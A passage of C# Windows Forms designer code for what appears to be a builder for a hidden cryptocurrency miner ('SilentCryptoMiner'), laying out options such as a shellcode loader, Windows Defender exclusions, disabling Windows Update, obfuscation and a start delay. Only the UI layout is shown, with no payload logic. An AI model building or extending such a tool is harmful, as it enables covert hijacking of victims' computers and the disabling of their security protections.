            this.txtAssemblyProduct.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyProduct.Enabled = false;
            this.txtAssemblyProduct.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyProduct.Location = new System.Drawing.Point(230, 47);
            this.txtAssemblyProduct.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyProduct.MaxLength = 32767;
            this.txtAssemblyProduct.MultiLine = false;
            this.txtAssemblyProduct.Name = "txtAssemblyProduct";
            this.txtAssemblyProduct.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyProduct.TabIndex = 0;
            this.txtAssemblyProduct.Text = "Product...";
            this.txtAssemblyProduct.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyProduct.UseSystemPasswordChar = false;
            this.txtAssemblyProduct.WordWrap = false;
            // 
            // txtAssemblyVersion4
            // 
            this.txtAssemblyVersion4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion4.Enabled = false;
            this.txtAssemblyVersion4.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion4.Location = new System.Drawing.Point(167, 157);
            this.txtAssemblyVersion4.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion4.MaxLength = 32767;
            this.txtAssemblyVersion4.MultiLine = false;
            this.txtAssemblyVersion4.Name = "txtAssemblyVersion4";
            this.txtAssemblyVersion4.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion4.TabIndex = 1;
            this.txtAssemblyVersion4.Text = "0";
            this.txtAssemblyVersion4.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion4.UseSystemPasswordChar = false;
            this.txtAssemblyVersion4.WordWrap = false;
            // 
            // txtAssemblyDescription
            // 
            this.txtAssemblyDescription.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyDescription.Enabled = false;
            this.txtAssemblyDescription.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyDescription.Location = new System.Drawing.Point(14, 83);
            this.txtAssemblyDescription.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyDescription.MaxLength = 32767;
            this.txtAssemblyDescription.MultiLine = false;
            this.txtAssemblyDescription.Name = "txtAssemblyDescription";
            this.txtAssemblyDescription.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyDescription.TabIndex = 0;
            this.txtAssemblyDescription.Text = "Description...";
            this.txtAssemblyDescription.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyDescription.UseSystemPasswordChar = false;
            this.txtAssemblyDescription.WordWrap = false;
            // 
            // txtAssemblyVersion3
            // 
            this.txtAssemblyVersion3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion3.Enabled = false;
            this.txtAssemblyVersion3.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion3.Location = new System.Drawing.Point(140, 157);
            this.txtAssemblyVersion3.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion3.MaxLength = 32767;
            this.txtAssemblyVersion3.MultiLine = false;
            this.txtAssemblyVersion3.Name = "txtAssemblyVersion3";
            this.txtAssemblyVersion3.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion3.TabIndex = 2;
            this.txtAssemblyVersion3.Text = "0";
            this.txtAssemblyVersion3.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion3.UseSystemPasswordChar = false;
            this.txtAssemblyVersion3.WordWrap = false;
            // 
            // txtAssemblyCopyright
            // 
            this.txtAssemblyCopyright.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyCopyright.Enabled = false;
            this.txtAssemblyCopyright.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyCopyright.Location = new System.Drawing.Point(230, 83);
            this.txtAssemblyCopyright.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyCopyright.MaxLength = 32767;
            this.txtAssemblyCopyright.MultiLine = false;
            this.txtAssemblyCopyright.Name = "txtAssemblyCopyright";
            this.txtAssemblyCopyright.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyCopyright.TabIndex = 0;
            this.txtAssemblyCopyright.Text = "Copyright...";
            this.txtAssemblyCopyright.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyCopyright.UseSystemPasswordChar = false;
            this.txtAssemblyCopyright.WordWrap = false;
            // 
            // txtAssemblyVersion2
            // 
            this.txtAssemblyVersion2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion2.Enabled = false;
            this.txtAssemblyVersion2.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion2.Location = new System.Drawing.Point(113, 157);
            this.txtAssemblyVersion2.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion2.MaxLength = 32767;
            this.txtAssemblyVersion2.MultiLine = false;
            this.txtAssemblyVersion2.Name = "txtAssemblyVersion2";
            this.txtAssemblyVersion2.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion2.TabIndex = 3;
            this.txtAssemblyVersion2.Text = "0";
            this.txtAssemblyVersion2.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion2.UseSystemPasswordChar = false;
            this.txtAssemblyVersion2.WordWrap = false;
            // 
            // txtAssemblyCompany
            // 
            this.txtAssemblyCompany.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyCompany.Enabled = false;
            this.txtAssemblyCompany.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyCompany.Location = new System.Drawing.Point(14, 119);
            this.txtAssemblyCompany.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyCompany.MaxLength = 32767;
            this.txtAssemblyCompany.MultiLine = false;
            this.txtAssemblyCompany.Name = "txtAssemblyCompany";
            this.txtAssemblyCompany.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyCompany.TabIndex = 0;
            this.txtAssemblyCompany.Text = "Company...";
            this.txtAssemblyCompany.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyCompany.UseSystemPasswordChar = false;
            this.txtAssemblyCompany.WordWrap = false;
            // 
            // txtAssemblyVersion1
            // 
            this.txtAssemblyVersion1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion1.Enabled = false;
            this.txtAssemblyVersion1.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion1.Location = new System.Drawing.Point(87, 157);
            this.txtAssemblyVersion1.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion1.MaxLength = 32767;
            this.txtAssemblyVersion1.MultiLine = false;
            this.txtAssemblyVersion1.Name = "txtAssemblyVersion1";
            this.txtAssemblyVersion1.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion1.TabIndex = 4;
            this.txtAssemblyVersion1.Text = "0";
            this.txtAssemblyVersion1.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion1.UseSystemPasswordChar = false;
            this.txtAssemblyVersion1.WordWrap = false;
            // 
            // txtAssemblyTrademark
            // 
            this.txtAssemblyTrademark.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyTrademark.Enabled = false;
            this.txtAssemblyTrademark.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyTrademark.Location = new System.Drawing.Point(230, 119);
            this.txtAssemblyTrademark.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyTrademark.MaxLength = 32767;
            this.txtAssemblyTrademark.MultiLine = false;
            this.txtAssemblyTrademark.Name = "txtAssemblyTrademark";
            this.txtAssemblyTrademark.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyTrademark.TabIndex = 0;
            this.txtAssemblyTrademark.Text = "Trademark...";
            this.txtAssemblyTrademark.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyTrademark.UseSystemPasswordChar = false;
            this.txtAssemblyTrademark.WordWrap = false;
            // 
            // tabIcon
            // 
            this.tabIcon.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabIcon.Controls.Add(this.chkIcon);
            this.tabIcon.Controls.Add(this.picIcon);
            this.tabIcon.Controls.Add(this.btnBrowseIcon);
            this.tabIcon.Controls.Add(this.txtIconPath);
            this.tabIcon.Location = new System.Drawing.Point(89, 4);
            this.tabIcon.Name = "tabIcon";
            this.tabIcon.Size = new System.Drawing.Size(418, 189);
            this.tabIcon.TabIndex = 3;
            this.tabIcon.Text = "Icon";
            // 
            // chkIcon
            // 
            this.chkIcon.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkIcon.BackColor = System.Drawing.Color.Transparent;
            this.chkIcon.Checked = false;
            this.chkIcon.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkIcon.ForeColor = System.Drawing.Color.Black;
            this.chkIcon.Location = new System.Drawing.Point(14, 12);
            this.chkIcon.Margin = new System.Windows.Forms.Padding(2);
            this.chkIcon.Name = "chkIcon";
            this.chkIcon.Size = new System.Drawing.Size(111, 24);
            this.chkIcon.TabIndex = 21;
            this.chkIcon.Text = "Disabled";
            this.chkIcon.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkIcon_CheckedChanged);
            // 
            // picIcon
            // 
            this.picIcon.ErrorImage = null;
            this.picIcon.Image = global::SilentCryptoMiner.Properties.Resources.icon1;
            this.picIcon.InitialImage = null;
            this.picIcon.Location = new System.Drawing.Point(160, 81);
            this.picIcon.Margin = new System.Windows.Forms.Padding(2);
            this.picIcon.Name = "picIcon";
            this.picIcon.Size = new System.Drawing.Size(96, 96);
            this.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picIcon.TabIndex = 11;
            this.picIcon.TabStop = false;
            // 
            // btnBrowseIcon
            // 
            this.btnBrowseIcon.BackColor = System.Drawing.Color.Transparent;
            this.btnBrowseIcon.Enabled = false;
            this.btnBrowseIcon.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnBrowseIcon.Location = new System.Drawing.Point(14, 48);
            this.btnBrowseIcon.Margin = new System.Windows.Forms.Padding(2);
            this.btnBrowseIcon.Name = "btnBrowseIcon";
            this.btnBrowseIcon.Size = new System.Drawing.Size(69, 25);
            this.btnBrowseIcon.TabIndex = 9;
            this.btnBrowseIcon.Text = "Browse";
            this.btnBrowseIcon.Click += new System.EventHandler(this.btnBrowseIcon_Click);
            // 
            // txtIconPath
            // 
            this.txtIconPath.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtIconPath.ForeColor = System.Drawing.Color.Silver;
            this.txtIconPath.Location = new System.Drawing.Point(87, 49);
            this.txtIconPath.Margin = new System.Windows.Forms.Padding(2);
            this.txtIconPath.MaxLength = 32767;
            this.txtIconPath.MultiLine = false;
            this.txtIconPath.Name = "txtIconPath";
            this.txtIconPath.Size = new System.Drawing.Size(302, 24);
            this.txtIconPath.TabIndex = 10;
            this.txtIconPath.Text = "Path to icon...";
            this.txtIconPath.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtIconPath.UseSystemPasswordChar = false;
            this.txtIconPath.WordWrap = false;
            // 
            // tabOptions
            // 
            this.tabOptions.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabOptions.Controls.Add(this.label2);
            this.tabOptions.Controls.Add(this.label3);
            this.tabOptions.Controls.Add(this.txtExeSize);
            this.tabOptions.Controls.Add(this.cFormAO);
            this.tabOptions.Controls.Add(this.btnAdvancedOptions);
            this.tabOptions.Controls.Add(this.pictureBox3);
            this.tabOptions.Controls.Add(this.labelOptionWindowsUpdate);
            this.tabOptions.Controls.Add(this.toggleWindowsUpdate);
            this.tabOptions.Controls.Add(this.pictureBox1);
            this.tabOptions.Controls.Add(this.chkBlockWebsites);
            this.tabOptions.Controls.Add(this.txtBlockWebsites);
            this.tabOptions.Controls.Add(this.label1);
            this.tabOptions.Controls.Add(this.toggleDisableSleep);
            this.tabOptions.Controls.Add(this.labelOptionShellcode);
            this.tabOptions.Controls.Add(this.toggleShellcode);
            this.tabOptions.Controls.Add(this.labelOptionAdministrator);
            this.tabOptions.Controls.Add(this.toggleAdministrator);
            this.tabOptions.Controls.Add(this.picAdmin1);
            this.tabOptions.Controls.Add(this.labelOptionObfuscation);
            this.tabOptions.Controls.Add(this.toggleObfuscation);
            this.tabOptions.Controls.Add(this.labelOptionWD);
            this.tabOptions.Controls.Add(this.toggleWDExclusions);
            this.tabOptions.Location = new System.Drawing.Point(89, 4);
            this.tabOptions.Name = "tabOptions";
            this.tabOptions.Padding = new System.Windows.Forms.Padding(3);
            this.tabOptions.Size = new System.Drawing.Size(418, 189);
            this.tabOptions.TabIndex = 5;
            this.tabOptions.Text = "Options";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.label2.Location = new System.Drawing.Point(204, 123);
            this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(27, 17);
            this.label2.TabIndex = 144;
            this.label2.Text = "mb";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.label3.Location = new System.Drawing.Point(17, 123);
            this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(146, 17);
            this.label3.TabIndex = 143;
            this.label3.Text = "Executable Size (about):";
            // 
            // txtExeSize
            // 
            this.txtExeSize.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtExeSize.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtExeSize.ForeColor = System.Drawing.Color.Silver;
            this.txtExeSize.Location = new System.Drawing.Point(168, 121);
            this.txtExeSize.MaxLength = 32767;
            this.txtExeSize.MultiLine = false;
            this.txtExeSize.Name = "txtExeSize";
            this.txtExeSize.Size = new System.Drawing.Size(34, 24);
            this.txtExeSize.TabIndex = 142;
            this.txtExeSize.Text = "0";
            this.txtExeSize.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtExeSize.UseSystemPasswordChar = false;
            this.txtExeSize.WordWrap = false;
            // 
            // cFormAO
            // 
            this.cFormAO.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.cFormAO.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.cFormAO.ForeColor = System.Drawing.Color.Silver;
            this.cFormAO.ItemHeight = 17;
            this.cFormAO.Location = new System.Drawing.Point(138, 161);
            this.cFormAO.Name = "cFormAO";
            this.cFormAO.Size = new System.Drawing.Size(10, 16);
            this.cFormAO.TabIndex = 141;
            this.cFormAO.Visible = false;
            // 
            // btnAdvancedOptions
            // 
            this.btnAdvancedOptions.BackColor = System.Drawing.Color.Transparent;
            this.btnAdvancedOptions.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAdvancedOptions.Location = new System.Drawing.Point(13, 157);
            this.btnAdvancedOptions.Margin = new System.Windows.Forms.Padding(2);
            this.btnAdvancedOptions.Name = "btnAdvancedOptions";
            this.btnAdvancedOptions.Size = new System.Drawing.Size(120, 24);
            this.btnAdvancedOptions.TabIndex = 140;
            this.btnAdvancedOptions.Text = "Advanced Options";
            this.btnAdvancedOptions.Click += new System.EventHandler(this.btnAdvancedOptions_Click);
            // 
            // pictureBox3
            // 
            this.pictureBox3.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox3.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
            this.pictureBox3.Location = new System.Drawing.Point(224, 94);
            this.pictureBox3.Name = "pictureBox3";
            this.pictureBox3.Size = new System.Drawing.Size(20, 20);
            this.pictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox3.TabIndex = 139;
            this.pictureBox3.TabStop = false;
            // 
            // labelOptionWindowsUpdate
            // 
            this.labelOptionWindowsUpdate.AutoSize = true;
            this.labelOptionWindowsUpdate.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionWindowsUpdate.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionWindowsUpdate.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.labelOptionWindowsUpdate.Location = new System.Drawing.Point(9, 94);
            this.labelOptionWindowsUpdate.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionWindowsUpdate.Name = "labelOptionWindowsUpdate";
            this.labelOptionWindowsUpdate.Size = new System.Drawing.Size(158, 17);
            this.labelOptionWindowsUpdate.TabIndex = 138;
            this.labelOptionWindowsUpdate.Text = "Disable Windows Update:";
            // 
            // toggleWindowsUpdate
            // 
            this.toggleWindowsUpdate.BackColor = System.Drawing.Color.Transparent;
            this.toggleWindowsUpdate.Checked = false;
            this.toggleWindowsUpdate.ForeColor = System.Drawing.Color.Black;
            this.toggleWindowsUpdate.Location = new System.Drawing.Point(169, 91);
            this.toggleWindowsUpdate.Margin = new System.Windows.Forms.Padding(2);
            this.toggleWindowsUpdate.Name = "toggleWindowsUpdate";
            this.toggleWindowsUpdate.Size = new System.Drawing.Size(50, 24);
            this.toggleWindowsUpdate.TabIndex = 137;
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
            this.pictureBox1.Location = new System.Drawing.Point(392, 131);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(20, 20);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 136;
            this.pictureBox1.TabStop = false;
            // 
            // chkBlockWebsites
            // 
            this.chkBlockWebsites.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkBlockWebsites.BackColor = System.Drawing.Color.Transparent;
            this.chkBlockWebsites.Checked = false;
            this.chkBlockWebsites.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkBlockWebsites.ForeColor = System.Drawing.Color.Black;
            this.chkBlockWebsites.Location = new System.Drawing.Point(263, 129);
            this.chkBlockWebsites.Margin = new System.Windows.Forms.Padding(2);
            this.chkBlockWebsites.Name = "chkBlockWebsites";
            this.chkBlockWebsites.Size = new System.Drawing.Size(146, 24);
            this.chkBlockWebsites.TabIndex = 135;
            this.chkBlockWebsites.Text = "Block Websites";
            this.chkBlockWebsites.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkBlockWebsites_CheckedChanged);
            // 
            // txtBlockWebsites
            // 
            this.txtBlockWebsites.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtBlockWebsites.Enabled = false;
            this.txtBlockWebsites.ForeColor = System.Drawing.Color.Silver;
            this.txtBlockWebsites.Location = new System.Drawing.Point(263, 157);
            this.txtBlockWebsites.Margin = new System.Windows.Forms.Padding(2);
            this.txtBlockWebsites.MaxLength = 32767;
            this.txtBlockWebsites.MultiLine = false;
            this.txtBlockWebsites.Name = "txtBlockWebsites";
            this.txtBlockWebsites.Size = new System.Drawing.Size(149, 24);
            this.txtBlockWebsites.TabIndex = 134;
            this.txtBlockWebsites.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtBlockWebsites.UseSystemPasswordChar = false;
            this.txtBlockWebsites.WordWrap = false;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.label1.ForeColor = System.Drawing.Color.Gray;
            this.label1.Location = new System.Drawing.Point(267, 38);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(90, 17);
            this.label1.TabIndex = 109;
            this.label1.Text = "Disable Sleep:";
            // 
            // toggleDisableSleep
            // 
            this.toggleDisableSleep.BackColor = System.Drawing.Color.Transparent;
            this.toggleDisableSleep.Checked = false;
            this.toggleDisableSleep.ForeColor = System.Drawing.Color.Black;
            this.toggleDisableSleep.Location = new System.Drawing.Point(362, 34);
            this.toggleDisableSleep.Margin = new System.Windows.Forms.Padding(2);
            this.toggleDisableSleep.Name = "toggleDisableSleep";
            this.toggleDisableSleep.Size = new System.Drawing.Size(50, 24);
            this.toggleDisableSleep.TabIndex = 108;
            // 
            // labelOptionShellcode
            // 
            this.labelOptionShellcode.AutoSize = true;
            this.labelOptionShellcode.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionShellcode.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionShellcode.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionShellcode.Location = new System.Drawing.Point(245, 8);
            this.labelOptionShellcode.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionShellcode.Name = "labelOptionShellcode";
            this.labelOptionShellcode.Size = new System.Drawing.Size(112, 17);
            this.labelOptionShellcode.TabIndex = 102;
            this.labelOptionShellcode.Text = "Shellcode Loader:";
            // 
            // toggleShellcode
            // 
            this.toggleShellcode.BackColor = System.Drawing.Color.Transparent;
            this.toggleShellcode.Checked = true;
            this.toggleShellcode.ForeColor = System.Drawing.Color.Black;
            this.toggleShellcode.Location = new System.Drawing.Point(362, 6);
            this.toggleShellcode.Margin = new System.Windows.Forms.Padding(2);
            this.toggleShellcode.Name = "toggleShellcode";
            this.toggleShellcode.Size = new System.Drawing.Size(50, 24);
            this.toggleShellcode.TabIndex = 101;
            // 
            // labelOptionAdministrator
            // 
            this.labelOptionAdministrator.AutoSize = true;
            this.labelOptionAdministrator.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionAdministrator.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionAdministrator.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionAdministrator.Location = new System.Drawing.Point(9, 38);
            this.labelOptionAdministrator.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionAdministrator.Name = "labelOptionAdministrator";
            this.labelOptionAdministrator.Size = new System.Drawing.Size(133, 17);
            this.labelOptionAdministrator.TabIndex = 99;
            this.labelOptionAdministrator.Text = "Run as Administrator:";
            // 
            // toggleAdministrator
            // 
            this.toggleAdministrator.BackColor = System.Drawing.Color.Transparent;
            this.toggleAdministrator.Checked = false;
            this.toggleAdministrator.ForeColor = System.Drawing.Color.Black;
            this.toggleAdministrator.Location = new System.Drawing.Point(169, 34);
            this.toggleAdministrator.Margin = new System.Windows.Forms.Padding(2);
            this.toggleAdministrator.Name = "toggleAdministrator";
            this.toggleAdministrator.Size = new System.Drawing.Size(50, 24);
            this.toggleAdministrator.TabIndex = 98;
            // 
            // picAdmin1
            // 
            this.picAdmin1.BackColor = System.Drawing.Color.Transparent;
            this.picAdmin1.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
            this.picAdmin1.Location = new System.Drawing.Point(224, 65);
            this.picAdmin1.Name = "picAdmin1";
            this.picAdmin1.Size = new System.Drawing.Size(20, 20);
            this.picAdmin1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picAdmin1.TabIndex = 97;
            this.picAdmin1.TabStop = false;
            // 
            // labelOptionObfuscation
            // 
            this.labelOptionObfuscation.AutoSize = true;
            this.labelOptionObfuscation.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionObfuscation.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionObfuscation.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionObfuscation.Location = new System.Drawing.Point(9, 10);
            this.labelOptionObfuscation.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionObfuscation.Name = "labelOptionObfuscation";
            this.labelOptionObfuscation.Size = new System.Drawing.Size(140, 17);
            this.labelOptionObfuscation.TabIndex = 89;
            this.labelOptionObfuscation.Text = "Pause for Obfuscation:";
            // 
            // toggleObfuscation
            // 
            this.toggleObfuscation.BackColor = System.Drawing.Color.Transparent;
            this.toggleObfuscation.Checked = false;
            this.toggleObfuscation.ForeColor = System.Drawing.Color.Black;
            this.toggleObfuscation.Location = new System.Drawing.Point(169, 6);
            this.toggleObfuscation.Margin = new System.Windows.Forms.Padding(2);
            this.toggleObfuscation.Name = "toggleObfuscation";
            this.toggleObfuscation.Size = new System.Drawing.Size(50, 24);
            this.toggleObfuscation.TabIndex = 88;
            // 
            // labelOptionWD
            // 
            this.labelOptionWD.AutoSize = true;
            this.labelOptionWD.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionWD.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionWD.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionWD.Location = new System.Drawing.Point(9, 65);
            this.labelOptionWD.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionWD.Name = "labelOptionWD";
            this.labelOptionWD.Size = new System.Drawing.Size(156, 17);
            this.labelOptionWD.TabIndex = 92;
            this.labelOptionWD.Text = "Add Defender Exclusions:";
            // 
            // toggleWDExclusions
            // 
            this.toggleWDExclusions.BackColor = System.Drawing.Color.Transparent;
            this.toggleWDExclusions.Checked = false;
            this.toggleWDExclusions.ForeColor = System.Drawing.Color.Black;
            this.toggleWDExclusions.Location = new System.Drawing.Point(169, 62);
            this.toggleWDExclusions.Margin = new System.Windows.Forms.Padding(2);
            this.toggleWDExclusions.Name = "toggleWDExclusions";
            this.toggleWDExclusions.Size = new System.Drawing.Size(50, 24);
            this.toggleWDExclusions.TabIndex = 91;
            // 
            // tabBuild
            // 
            this.tabBuild.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabBuild.Controls.Add(this.labelSeconds);
            this.tabBuild.Controls.Add(this.labelStartDelay);
            this.tabBuild.Controls.Add(this.txtStartDelay);
            this.tabBuild.Controls.Add(this.labelHackforums);
            this.tabBuild.Controls.Add(this.labelGitHub);
            this.tabBuild.Controls.Add(this.txtLog);
            this.tabBuild.Controls.Add(this.btnBuild);
            this.tabBuild.Location = new System.Drawing.Point(89, 4);
            this.tabBuild.Name = "tabBuild";
            this.tabBuild.Size = new System.Drawing.Size(418, 189);
            this.tabBuild.TabIndex = 4;
            this.tabBuild.Text = "Build";
            // 
            // labelSeconds
            // 
            this.labelSeconds.AutoSize = true;
            this.labelSeconds.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelSeconds.Location = new System.Drawing.Point(121, 11);
            this.labelSeconds.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelSeconds.Name = "labelSeconds";
            this.labelSeconds.Size = new System.Drawing.Size(57, 17);
            this.labelSeconds.TabIndex = 57;
            this.labelSeconds.Text = "Seconds";
            // 
            // labelStartDelay
            // 
            this.labelStartDelay.AutoSize = true;
            this.labelStartDelay.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartDelay.Location = new System.Drawing.Point(10, 11);
            this.labelStartDelay.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartDelay.Name = "labelStartDelay";
            this.labelStartDelay.Size = new System.Drawing.Size(74, 17);
            this.labelStartDelay.TabIndex = 56;
            this.labelStartDelay.Text = "Start Delay:";
            // 
            // txtStartDelay
            // 
            this.txtStartDelay.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStartDelay.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtStartDelay.ForeColor = System.Drawing.Color.Silver;
            this.txtStartDelay.Location = new System.Drawing.Point(85, 9);
            this.txtStartDelay.MaxLength = 32767;
            this.txtStartDelay.MultiLine = false;
            this.txtStartDelay.Name = "txtStartDelay";
            this.txtStartDelay.Size = new System.Drawing.Size(34, 24);
            this.txtStartDelay.TabIndex = 55;
            this.txtStartDelay.Text = "15";
            this.txtStartDelay.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStartDelay.UseSystemPasswordChar = false;
            this.txtStartDelay.WordWrap = false;
            // 
            // labelHackforums
            // 
